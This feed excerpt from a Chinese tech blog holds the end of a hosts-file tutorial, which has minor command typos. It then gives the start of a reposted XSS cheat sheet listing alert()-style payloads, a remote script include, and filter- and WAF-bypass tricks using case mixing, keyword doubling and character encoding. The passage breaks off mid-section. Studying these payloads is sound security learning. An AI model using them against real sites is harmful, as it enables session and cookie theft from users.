    <content type="html"><![CDATA[<h2 id="一-什么是-hosts"><a class="markdownIt-Anchor" href="#一-什么是-hosts"></a> 一、什么是 hosts</h2><p>hosts —— the static table lookup for host name（主机名查询静态表）。</p><p>hosts文件是一个用于储存计算机网络中各节点信息的计算机文件。这个文件负责将主机名映射到相应的IP地址。hosts文件通常用于补充或取代网络中DNS的功能。和DNS不同的是，计算机的用户可以直接对hosts文件进行控制。</p><p>Hosts是一个没有扩展名的系统文件，其作用就是将一些常用的网址<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062" target="_blank" rel="noopener">域名</a>与其对应的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从<a href="https://baike.baidu.com/item/Hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">Hosts文件</a>中寻找对应的<a href="https://baike.baidu.com/item/IP%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">IP地址</a>，一旦找到，系统会立即打开对应网页，如果没有找到，则系统会再将网址提交DNS<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">域名解析</a>服务器进行IP地址的解析。</p><p>优先级 ： dns缓存 &gt; hosts &gt; dns服务</p><h2 id="二-hosts的位置"><a class="markdownIt-Anchor" href="#二-hosts的位置"></a> 二、hosts的位置</h2><p><a href="https://laod.cn/tag/hosts" target="_blank" rel="noopener">hosts</a>在各个系统中所在的文件夹：</p><ul><li>Windows 系统<a href="https://laod.cn/tag/host" target="_blank" rel="noopener">host</a>s位于 C:\Windows\System32\drivers\etc\hosts</li><li>Android（安卓）系统hosts位于 /etc/hosts</li><li>Mac（苹果电脑）系统hosts位于 /etc/hosts</li><li>iPhone（iOS）系统hosts位于 /etc/hosts</li><li>Linux系统hosts位于 /etc/hosts</li><li>绝大多数Unix系统都是在 /etc/hosts</li></ul><h2 id="三-hosts的内容"><a class="markdownIt-Anchor" href="#三-hosts的内容"></a> 三、hosts的内容</h2><p>Windows版本的hosts文件内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="line"># # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="line">#</span><br><span class="line"># This file contains the mappings of IP addresses to host names. Each </span><br><span class="line"># entry should be kept on an individual line. The IP address should</span><br><span class="line"># be placed in the first column followed by the corresponding host name. </span><br><span class="line"># The IP address and the host name should be separated by at least one </span><br><span class="line"># space.</span><br><span class="line"># </span><br><span class="line"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="line"># lines or following the machine name denoted by a &apos;#&apos; symbol.</span><br><span class="line"># </span><br><span class="line"># For example:</span><br><span class="line">#</span><br><span class="line"># 102.54.94.97 rhino.acme.com # source server</span><br><span class="line"># 38.25.63.10 x.acme.com # x client host</span><br><span class="line"># localhost name resolution is handled within DNS itself.</span><br><span class="line"># 127.0.0.1 localhost</span><br><span class="line"># ::1 localhost</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>#后都是注释，所以清空hosts文件对系统正常运行并没有什么影响。</p><p>在一个局域网中，每台机器都有一个主机名，用于区分主机，便于相互访问。</p><p>一般/etc/hosts的内容一般有如下类似内容：</p><p>127.0.0.1  localhost.localdomain   localhost</p><p>192.168.1.100   <a href="http://linumu100.com" target="_blank" rel="noopener">linumu100.com</a>   linumu100</p><p>192.168.1.120  ftpserver   ftp120</p><p>一般情况下hosts文件的每行尾一个主机，每行由三部分组成，每个部分由空格隔开。</p><p>第一部分：网络IP地址；</p><p>第二部分：主机名或域名；</p><p>第三部分：主机名别名；</p><p>当然每行也可以是两部分，即主机IP地址和主机名。</p><p>主机名（hostname)和域名（domain)的区别：</p><p>主机名通常在局域网内使用，通过hosts文件，主机名就被解析到对应IP;</p><p>域名通常在INTERNET上使用，但如果本机不想使用internet上的域名解析，这时就可以更改hosts文件，加入自己的域名解析。</p><h2 id="四-hosts的作用"><a class="markdownIt-Anchor" href="#四-hosts的作用"></a> 四、hosts的作用</h2><p>1、加快<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90" target="_blank" rel="noopener">域名解析</a></p><p>对于要经常访问的网站，我们可以通过在Hosts中配置<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>和IP的映射关系，提高域名解析速度。由于有了映射关系，当我们输入域名计算机就能很快解析出IP，而不用请求网络上的DNS服务器。</p><p>2、方便局域网用户</p><p>在很多单位的局域网中，会有服务器提供给用户使用。但由于局域网中一般很少架设DNS服务器，访问这些服务器时，要输入难记的IP地址。这对不少人来说相当麻烦。可以分别给这些服务器取个容易记住的名字，然后在Hosts中建立IP映射，这样以后访问的时候，只要输入这个服务器的名字就行了。</p><p>3、屏蔽网站（<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E9%87%8D%E5%AE%9A%E5%90%91" target="_blank" rel="noopener">域名重定向</a>）</p><p>有很多网站不经过用户同意就将各种各样的<a href="https://baike.baidu.com/item/%E6%8F%92%E4%BB%B6" target="_blank" rel="noopener">插件</a>安装到你的计算机中，其中有些说不定就是木马或病毒。对于这些网站我们可以利用Hosts把该网站的<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>映射到错误的IP或本地计算机的IP，这样就不用访问了。</p><p>4、顺利连接系统</p><p>对于Lotus的服务器和一些<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8" target="_blank" rel="noopener">数据库服务器</a>，在访问时如果直接输入IP地址那是不能访问的，只能输入服务器名才能访问。那么我们配置好Hosts文件，这样输入服务器名就能顺利连接了。</p><p>5.虚拟域名</p><p>很多时候，网站建设者需要把”软环境“搭建好，再进行上传调试。但类似于邮件服务，则需要使用域名来辅助调试，这时就可以将本地 IP 地址与一个”虚拟域名“做地址指向，就可以达到要求的效果，且无需花费。如：</p><ul><li>127.0.0.1 网站域名</li><li>之后在浏览器地址栏中输入对应的网站域名即可。</li></ul><h2 id="五-如何修改hosts"><a class="markdownIt-Anchor" href="#五-如何修改hosts"></a> 五、如何修改hosts</h2><h3 id="1-屏蔽网站域名重定向"><a class="markdownIt-Anchor" href="#1-屏蔽网站域名重定向"></a> 1、屏蔽网站（域名重定向）</h3><p>在WINDOWS系统中，约定 127.0.0.1 为本地计算机的IP地址, 0.0.0.0是错误的IP地址。</p><p>如果，我们在hosts中，写入以下内容：</p><p>127.0.0.1 要屏蔽的网站A的域名</p><p>0.0.0.0 要屏蔽的网站B的域名</p><p>这样，计算机<a href="https://baike.baidu.com/item/%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">解析域名</a>A和 B时，就解析到本机IP或错误的IP，达到了屏蔽网站A 和B的目的。</p><p>在修改hosts文件时候，还常常遇到修改保存后无效的情况，这里要提醒大家注意的一点：很多人是写在最后行，写完最后一行后在没有回车的情况下，这一行是不生效的。一定要记得回车。建议大家遵循这样的习惯：“ip地址+Tab+<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>+换行” 添加记录。</p><h3 id="2-局域网用户访问"><a class="markdownIt-Anchor" href="#2-局域网用户访问"></a> 2、局域网用户访问</h3><p>如果，我们在A主机的hosts中，写入以下内容：</p><p>B主机的ip B主机名</p><p>这样我们就可以通过B主机名找到B主机及其服务。</p><h3 id="3-android系统的hosts修改"><a class="markdownIt-Anchor" href="#3-android系统的hosts修改"></a> 3、android系统的hosts修改</h3><p>在 Android 下，/etc 是 link 到 /system/etc 的，我们需要修改 /system/etc/hosts 来实现。但是这个文件是只读，不能通过 shell 直接修改。可以通过连接到 PC 上使用 adb 来修改。步骤如下：</p><p>（1）获得<a href="https://baike.baidu.com/item/root%E6%9D%83%E9%99%90" target="_blank" rel="noopener">root权限</a>：adb root</p><p>（2）设置/system为可读写：adb remount</p><p>（3）将<a href="https://baike.baidu.com/item/hosts%E6%96%87%E4%BB%B6" target="_blank" rel="noopener">hosts文件</a>复制到PC：adb pull /system/etc/hosts</p><p>（4）修改PC机上文件</p><p>（5）将PC机上文件复制到手机：adb push /system/etc/hosts</p><p>如果要查看是否修改成功，可以在PC上执行adb shell，运行cat /system/etc/hosts;或者在手机上运行cat /system/etc/hosts。</p><p>在Android系统中，hosts文件格式有一点与PC机Linux不同：不能在一行中一个IP对应多个<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D" target="_blank" rel="noopener">域名</a>，比如：</p><p>127.0.0.1 <a href="http://host1.example.com" target="_blank" rel="noopener">host1.example.com</a> <a href="http://host2.example.com" target="_blank" rel="noopener">host2.example.com</a> <a href="http://host3.example.com" target="_blank" rel="noopener">host3.example.com</a></p><p>在大多PC机Linux系统是合法的，但不能在Android上起作用，需要拆成每个域名一行才能使用：</p><p>x.x.x.x <a href="http://host1.example.com" target="_blank" rel="noopener">host1.example.com</a></p><p>x.x.x.x <a href="http://host2.example.com" target="_blank" rel="noopener">host2.example.com</a></p><p>x.x.x.x <a href="http://host3.example.com" target="_blank" rel="noopener">host3.example.com</a></p><h3 id="4-通过修改hosts上google"><a class="markdownIt-Anchor" href="#4-通过修改hosts上google"></a> 4、通过修改hosts上google</h3><p>第一步：下载可以正常使用的hosts文件</p><p>可以在百度搜索类似“Google hosts”等相关关键词或者老D，找到最新可用的host文件。</p><p>第二步：修改本地hosts文件</p><p>在电脑系统中找到hosts，路径基本上是C:\Windows\System32\drivers\etc，然后将下载的hosts文件将本地hosts文件替换，或者在本地hosts文件中直接在地址栏修改即可！</p><p>第三步：刷新本地dns</p><p>第二步完成本地hosts文件的修改之后，可以使用dos命令完成最后的操作。</p><p>（1）使用WIN+R键，启动运行，键入cmd</p><p>（2）在dos界面输入“ipcong /flushdns”</p><p>（3）dos命令窗提示“已成功刷新DNS解析缓存”，就完成了。</p><h2 id="六-其他"><a class="markdownIt-Anchor" href="#六-其他"></a> 六、其他</h2><h3 id="1-怎么获取域名所对应的ip地址"><a class="markdownIt-Anchor" href="#1-怎么获取域名所对应的ip地址"></a> 1、怎么获取域名所对应的IP地址</h3><p>打开“开始――运行”，输入“cmd”，在命令行界面输入“ping <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>”，回车。</p><p>显示结果类似：Reply from 220.181.6.18:bytes=32 time=24msTTL=55。</p><p>其中的220.181.6.18就是域名所对应IP地址（百度的）。呵呵！</p><h3 id="2-修改hosts后生效方法"><a class="markdownIt-Anchor" href="#2-修改hosts后生效方法"></a> 2、修改hosts后生效方法</h3><p>（1）Windows</p><p>开始 -&gt; 运行 -&gt; 输入cmd -&gt; 在CMD窗口输入</p><p>ipconfig /flushdns</p><p>（2）Linux</p><p>打开终端</p><p>重启网络：</p><p>sudo /etc/init.d/networking restart</p><p>desktop版可以这样重启：</p><p>sudo service network-manager restart</p><p>如果只是修改了某个网卡(例如eth0)的信息，也可以通过重启网卡的方式使其修改生效。</p><p>sudo ifdown eth0 sudo ifup eth0</p><p>如果不懂请都尝试下</p><p>（3）Mac OS X终端输入</p><p>sudo killall -HUP mDNSResponder</p><p>（4）Android</p><p>开启飞行模式 -&gt; 关闭飞行模式</p><p>（5）通用方法</p><p>拔网线(断网) -&gt; 插网线(重新连接网络)</p><p>如不行请清空浏览器缓存（建议不要使用国产浏览器，请使用谷歌Chrome浏览器）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一-什么是-hosts&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#一-什么是-hosts&quot;&gt;&lt;/a&gt; 一、什么是 hosts&lt;/h2&gt;
&lt;p&gt;hosts —— the static table lookup for host nam
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>【转载】 XSS 总结</title>
    <link href="https://muzibing.github.io/2020/02/23/2020.02.23%EF%BC%8894%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/23/2020.02.23（94）/</id>
    <published>2020-02-22T16:00:00.000Z</published>
    <updated>2020-02-23T02:55:08.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简述"><a class="markdownIt-Anchor" href="#简述"></a> 简述</h1><p>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><h1 id="常用的xss攻击手段和目的"><a class="markdownIt-Anchor" href="#常用的xss攻击手段和目的"></a> 常用的XSS攻击手段和目的</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.盗用cookie，获取敏感信息。</span><br><span class="line">2.利用植入Flash，通过crossdomain权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</span><br><span class="line">3.利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的操作如发微博、加好友、发私信等操作。</span><br><span class="line">4.利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</span><br><span class="line">5.在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDOS攻击的效果。</span><br></pre></td></tr></table></figure><h1 id="分类"><a class="markdownIt-Anchor" href="#分类"></a> 分类</h1><h2 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</span><br><span class="line">反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</span><br></pre></td></tr></table></figure><h2 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</span><br><span class="line">此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</span><br></pre></td></tr></table></figure><h2 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</span><br></pre></td></tr></table></figure><h1 id="无任何过滤情况下"><a class="markdownIt-Anchor" href="#无任何过滤情况下"></a> 无任何过滤情况下</h1><h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签"></a> 一些常见标签</h2><p><strong>PS：下面我列举的标签大部分是可以自动触发js代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发，还有我测试的浏览器是火狐，Chrome，IE11.0，其它的浏览器没有去测试，有兴趣的师傅可以测试一下 =。=</strong></p><p><code>script</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>img</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>input</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">竞争焦点，从而触发onblur事件</span><br><span class="line">&lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;input onfocus=&quot;alert(&apos;xss&apos;);&quot; autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>details</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br><span class="line">使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line">&lt;details open ontoggle=&quot;alert(&apos;xss&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>svg</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>select</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=alert(1)&gt;&lt;/select&gt;</span><br><span class="line">通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line">&lt;select onfocus=alert(1) autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>iframe</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>video</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>audio</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p><code>body</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body</span><br><span class="line">onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>textarea</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</span><br></pre></td></tr></table></figure><p><code>keygen</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</span><br></pre></td></tr></table></figure><p><code>marquee</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure><p><code>isindex</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</span><br></pre></td></tr></table></figure><h3 id="利用link远程包含js文件"><a class="markdownIt-Anchor" href="#利用link远程包含js文件"></a> 利用link远程包含js文件</h3><p><strong>PS：在无CSP的情况下才可以</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议"></a> javascript伪协议</h3><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&apos;xss&apos;)&gt;//IE7以下</span><br></pre></td></tr></table></figure><p><code>&lt;form&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</span><br></pre></td></tr></table></figure><h3 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h3><p>expression属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=&quot;xss:expression(alert(&apos;xss&apos;&apos;))&quot;&gt; // IE7以下</span><br><span class="line">&lt;div style=&quot;color:rgb(&apos;&apos;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下</span><br><span class="line">&lt;style&gt;#test&#123;x:expression(alert(/XSS/))&#125;&lt;/style&gt; // IE7以下</span><br></pre></td></tr></table></figure><p>background属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure><h1 id="有过滤的情况下"><a class="markdownIt-Anchor" href="#有过滤的情况下"></a> 有过滤的情况下</h1><h2 id="过滤空格"><a class="markdownIt-Anchor" href="#过滤空格"></a> 过滤空格</h2><p>用<code>/</code>代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h2 id="过滤关键字"><a class="markdownIt-Anchor" href="#过滤关键字"></a> 过滤关键字</h2><h3 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过"></a> 大小写绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ImG sRc=x onerRor=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字"></a> 双写关键字</h3><p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;imimgg srsrcc=x onerror=alert(&quot;xss&quot;);&gt;</span><br></pre></td></tr></table></figure><h3 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接"></a> 字符拼接</h3><p>利用eval</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure><p>利用top</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆"></a> 其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure><h3 id="编码绕过"><a class="markdownIt-Anchor" href="#编码绕过"></a> 编码绕过</h3><p><code>Unicode编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>url编码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p><code>Ascii码绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>hex绕过</code></p><figure class="highlight plain"><table><tr><td 